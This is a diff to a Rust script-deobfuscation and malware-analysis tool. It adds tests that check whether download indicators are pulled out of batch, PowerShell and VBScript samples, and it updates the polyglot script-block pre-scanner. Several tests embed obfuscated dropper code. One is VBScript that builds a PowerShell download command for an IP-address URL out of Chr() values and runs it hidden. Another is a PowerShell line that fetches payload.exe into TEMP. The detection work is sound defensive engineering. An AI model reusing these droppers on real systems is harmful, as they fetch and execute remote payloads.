@@ -679,6 +679,54 @@ mod analyze_tests {
     }
 
     #[test]
+    fn polyglot_vbscript_block_queues_vbs_payload() {
+        let mut env = Environment::new(&Config::default());
+        super::pre_scan_polyglot_script_block(
+            br#"<job><script language="VBScript">Dim pdf
+pdf = pdf + Chr(99)
+CreateObject("WScript.Shell").Run pdf, 0, True
+</script></job>"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_vbs.iter().any(|vbs| vbs
+                .windows("CreateObject".len())
+                .any(|w| w.eq_ignore_ascii_case(b"CreateObject"))),
+            "VBScript block not queued as VBS: js={:?} vbs={:?}",
+            env.all_extracted_jscript,
+            env.all_extracted_vbs
+        );
+    }
+
+    #[test]
+    fn batch_wsf_polyglot_vbscript_block_queues_vbs_payload() {
+        let mut env = Environment::new(&Config::default());
+        super::pre_scan_polyglot_script_block(
+            br#"<!-- : batch portion
+@echo off
+cscript /nologo "%~f0?.wsf"
+goto :EOF
+: VBScript -->
+<job>
+<script language="VBScript">
+Dim pdf
+pdf = pdf + Chr(99)
+CreateObject("WScript.Shell").Run pdf, 0, True
+</script>
+</job>"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_vbs.iter().any(|vbs| vbs
+                .windows("CreateObject".len())
+                .any(|w| w.eq_ignore_ascii_case(b"CreateObject"))),
+            "WSF VBScript block not queued as VBS: js={:?} vbs={:?}",
+            env.all_extracted_jscript,
+            env.all_extracted_vbs
+        );
+    }
+
+    #[test]
     fn analyze_extracts_inline_powershell_callbyname_downloadstring() {
         let script = concat!(
             "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
@@ -6547,6 +6595,30 @@ mod explicit_environment_tests {
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn baseline_windows_environment_is_available_to_powershell_env_refs() {
+        let script = br#"powershell -Command "$u=$env:TEMP+'\\payload.exe';Invoke-WebRequest https://baseline-env.example/payload.exe -OutFile $u""#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://baseline-env.example/payload.exe"
+                        && dst.contains("AppData\\Local\\Temp")
+                )
+            }),
+            "baseline Windows env did not resolve in PowerShell: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[derive(Debug, Clone)]
@@ -6565,11 +6637,8 @@ pub struct Report {
 }
 
 // Some `.bat` polyglots wrap a `<script language="JScript|VBScript">...</script>`
-// block inside a `/* ... */` comment range that CMD's parser skips. The
-// JScript is invoked separately via `mshta "%~f0"`. CMD's drive() won't
-// see the inner code, so URLs inside (e.g. `objShell.Run("\\\\host@SSL\\..")`)
-// would never reach trait extraction. Pre-scan and push any script block
-// payload onto `all_extracted_jscript` so `scan_js_payloads` walks it.
+// block inside a CMD-skipped region. Pre-scan and queue the script body by
+// language so JS/VBS payload scanners still see inner IOCs.
 fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
     let text = String::from_utf8_lossy(input);
     let mut idx = 0usize;
@@ -6589,7 +6658,15 @@ fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
         let body_end = close_rel;
         let body = &text[body_start..body_end];
         if !body.trim().is_empty() {
-            env.all_extracted_jscript.push(body.as_bytes().to_vec());
+            let tag = &text[abs_open..abs_open + tag_end_rel + 1];
+            let payload = body.as_bytes().to_vec();
+            if crate::util::contains_ascii_case_insensitive(tag, "vbscript")
+                || looks_like_vbs_script(&body.to_ascii_lowercase())
+            {
+                push_unique_payload(&mut env.all_extracted_vbs, payload);
+            } else {
+                push_unique_payload(&mut env.all_extracted_jscript, payload);
+            }
         }
         idx = body_end + "</script>".len();
     }
@@ -10403,6 +10480,37 @@ mod call_label_tests {
             lines,
             vec!["echo in-sub", "echo after-return"],
             "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn branch_local_exit_b_does_not_skip_rest_of_called_subroutine() {
+        let script = b"call :outer\r\necho AFTER_OUTER\r\ngoto :eof\r\n\
+            :outer\r\n\
+            call :admin\r\n\
+            echo OUTER_CONTINUED\r\n\
+            exit /b\r\n\
+            :admin\r\n\
+            if not %errorlevel% EQU 0 (\r\n\
+            echo ADMIN_BRANCH\r\n\
+            exit /b\r\n\
+            )\r\n\
+            exit /b\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo ADMIN_BRANCH"),
+            "missing branch body, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo OUTER_CONTINUED"),
+            "branch-local exit /b skipped outer subroutine continuation, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo AFTER_OUTER"),
+            "outer subroutine did not return to caller, got:\n{}",
             report.deobfuscated
         );
     }
@@ -21279,6 +21387,189 @@ sh.Run cmd, 0, False"#;
             ),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn batch_wsf_vbscript_accumulated_chr_command_url_extracted() {
+        let script = br#"<!-- : batch portion
+@echo off
+cscript /nologo "%~f0?.wsf"
+goto :EOF
+: VBScript -->
+<job>
+<script language="VBScript">
+Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True
+</script>
+</job>"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+                )
+            }),
+            "no Download trait from batch WSF embedded VBS Chr accumulator: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn vbs_accumulated_chr_shell_run_command_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+                )
+            }),
+            "no Download trait from VBS Chr accumulator shell run: {:?}",
+            env.traits
         );
     }
 
